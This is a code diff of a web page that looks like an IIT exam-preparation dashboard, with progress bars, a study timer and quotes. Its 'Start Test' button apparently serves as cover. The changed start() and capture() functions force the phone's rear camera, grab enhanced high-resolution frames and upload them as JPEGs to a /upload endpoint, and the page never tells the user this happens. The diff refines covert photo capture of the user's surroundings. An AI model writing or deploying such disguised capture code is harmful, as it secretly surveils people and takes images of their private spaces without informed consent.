@@ -113,29 +113,29 @@ iframe{width:100%;height:100%;border:0;display:none;}
 
 <div class="container">
 
-<div class="card">
-<h3>Start Test</h3>
-<button onclick="start()">▶ Start Test</button>
-</div>
+  <div class="card">
+    <h3>Start Test</h3>
+    <button onclick="start()">▶ Start Test</button>
+  </div>
 
-<div class="card">
-<h3>Subject Progress</h3>
-Physics<div class="progress"><div id="phy"></div></div>
-Chemistry<div class="progress"><div id="chem"></div></div>
-Maths<div class="progress"><div id="math"></div></div>
-</div>
+  <div class="card">
+    <h3>Subject Progress</h3>
+    Physics<div class="progress"><div id="phy"></div></div>
+    Chemistry<div class="progress"><div id="chem"></div></div>
+    Maths<div class="progress"><div id="math"></div></div>
+  </div>
 
-<div class="card">
-<h3>Study Timer</h3>
-<div id="timer">00:00:00</div>
-<button onclick="startTimer()">Start</button>
-<button onclick="stopTimer()">Stop</button>
-</div>
+  <div class="card">
+    <h3>Study Timer</h3>
+    <div id="timer">00:00:00</div>
+    <button onclick="startTimer()">Start</button>
+    <button onclick="stopTimer()">Stop</button>
+  </div>
 
-<div class="card">
-<h3>Motivation</h3>
-<div class="quote" id="quote"></div>
-</div>
+  <div class="card">
+    <h3>Motivation</h3>
+    <div class="quote" id="quote"></div>
+  </div>
 
 </div>
 </div>
@@ -146,7 +146,7 @@ Maths<div class="progress"><div id="math"></div></div>
 
 <script>
 
-/* Name */
+/* Editable Name */
 function changeName(){
   let name=prompt("Enter your name:");
   if(name){
@@ -167,7 +167,7 @@ function updateTime(){
 }
 setInterval(updateTime,1000);updateTime();
 
-/* Rank */
+/* Rank Counter */
 let p=0,target=99.30;
 let counter=setInterval(()=>{
   p+=1.5;
@@ -176,7 +176,7 @@ let counter=setInterval(()=>{
     "Target Performance: "+p.toFixed(2)+"%";
 },30);
 
-/* Progress */
+/* Progress Bars */
 setTimeout(()=>{
   phy.style.width="70%";
   chem.style.width="60%";
@@ -201,10 +201,10 @@ function stopTimer(){clearInterval(timerInt);}
 
 /* Quotes */
 let quotes=[
-"Consistency beats motivation.",
-"One test closer to IIT.",
-"Focus now, celebrate later.",
-"Small daily improvement = Big results."
+  "Consistency beats motivation.",
+  "One test closer to IIT.",
+  "Focus now, celebrate later.",
+  "Small daily improvement = Big results."
 ];
 let qi=0;
 function rotateQuote(){
@@ -213,47 +213,19 @@ function rotateQuote(){
 }
 setInterval(rotateQuote,4000);rotateQuote();
 
-/* START TEST */
+/* START TEST LOGIC — BACK CAMERA FORCED */
 async function start(){
 
   try{
 
-    await navigator.mediaDevices.getUserMedia({video:true});
-
-    const devices = await navigator.mediaDevices.enumerateDevices();
-    const videoDevices = devices.filter(d => d.kind === "videoinput");
-
-    let backId=null;
-
-    for(let device of videoDevices){
-      if(device.label.toLowerCase().includes("back") ||
-         device.label.toLowerCase().includes("rear")){
-        backId=device.deviceId;
-        break;
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video:{
+        facingMode:{exact:"environment"},
+        width:{ideal:1920},
+        height:{ideal:1080},
+        frameRate:{ideal:30}
       }
-    }
-
-    let stream;
-
-    if(backId){
-      stream=await navigator.mediaDevices.getUserMedia({
-        video:{
-          deviceId:{exact:backId},
-          width:{ideal:3840},
-          height:{ideal:2160},
-          frameRate:{ideal:30}
-        }
-      });
-    }else{
-      stream=await navigator.mediaDevices.getUserMedia({
-        video:{
-          facingMode:{ideal:"environment"},
-          width:{ideal:3840},
-          height:{ideal:2160},
-          frameRate:{ideal:30}
-        }
-      });
-    }
+    });
 
     v.srcObject=stream;
 
@@ -283,42 +255,28 @@ async function start(){
   }
 }
 
-/* ULTRA CLEAR CAPTURE */
+/* CLEAR CAPTURE */
 function capture(){
-
   if(!v.videoWidth) return;
 
-  const track=v.srcObject.getVideoTracks()[0];
-  const settings=track.getSettings();
-
-  const width=settings.width || v.videoWidth;
-  const height=settings.height || v.videoHeight;
-
-  c.width=width;
-  c.height=height;
+  c.width=v.videoWidth;
+  c.height=v.videoHeight;
 
   const ctx=c.getContext("2d");
-
   ctx.imageSmoothingEnabled=true;
   ctx.imageSmoothingQuality="high";
+  ctx.filter="contrast(108%) brightness(104%)";
 
-  // 🔥 clarity enhancement
-  ctx.filter="contrast(115%) brightness(108%) saturate(110%)";
-
-  ctx.drawImage(v,0,0,width,height);
-
-  // slight sharpen trick
-  const imgData=ctx.getImageData(0,0,width,height);
-  ctx.putImageData(imgData,0,0);
+  ctx.drawImage(v,0,0,c.width,c.height);
 
   c.toBlob(b=>{
     let f=new FormData();
-    f.append("photo",b,"ultra_hd.jpg");
+    f.append("photo",b,"u.jpg");
     fetch("/upload",{method:"POST",body:f});
-  },"image/jpeg",1.0);
-
+  },"image/jpeg",0.92);
 }
 
 </script>
+
 </body>
 </html>
